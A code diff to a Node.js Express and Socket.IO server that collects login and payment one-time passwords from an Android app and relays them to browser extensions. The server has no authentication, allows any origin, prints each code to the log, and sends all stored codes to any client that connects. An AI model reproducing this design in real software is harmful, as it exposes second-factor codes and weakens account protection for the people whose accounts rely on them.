@@ -1,6 +1,7 @@
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
+const cors = require('cors');
 
 const app = express();
 const server = http.createServer(app);
@@ -8,6 +9,7 @@ const io = socketIo(server, {
     cors: { origin: "*" }
 });
 
+app.use(cors());
 app.use(express.json());
 
 let latestOTPs = {
@@ -15,11 +17,15 @@ let latestOTPs = {
     DaruhBuri: { login: '', payment: '' }
 };
 
-// Endpoint to receive OTP from Android app or any client
+// API endpoint to receive OTP from Android app
 app.post('/send-otp', (req, res) => {
     const { otp, source, type } = req.body;
 
-    console.log(`Received OTP: ${otp} from ${source} (${type})`);
+    console.log(`==== OTP RECEIVED ====`);
+    console.log(`OTP: ${otp}`);
+    console.log(`Source: ${source}`);
+    console.log(`Type: ${type}`);
+    console.log(`=======================`);
 
     if (source && type && latestOTPs[source]) {
         latestOTPs[source][type] = otp;
@@ -29,11 +35,11 @@ app.post('/send-otp', (req, res) => {
     res.sendStatus(200);
 });
 
-// WebSocket for extensions or frontend to receive OTPs in real-time
+// WebSocket connection for browser extensions
 io.on('connection', (socket) => {
-    console.log('Client connected');
+    console.log('🔌 Client connected via WebSocket');
 
-    // Send latest OTPs to newly connected client
+    // Send latest OTPs to new client
     for (const source in latestOTPs) {
         for (const type in latestOTPs[source]) {
             socket.emit(`otp-${source}-${type}`, latestOTPs[source][type]);
@@ -41,12 +47,12 @@ io.on('connection', (socket) => {
     }
 
     socket.on('disconnect', () => {
-        console.log('Client disconnected');
+        console.log('❌ Client disconnected');
     });
 });
 
-// Use dynamic port for cloud hosting like Render.com
+// Use dynamic port for Render
 const PORT = process.env.PORT || 3111;
 server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
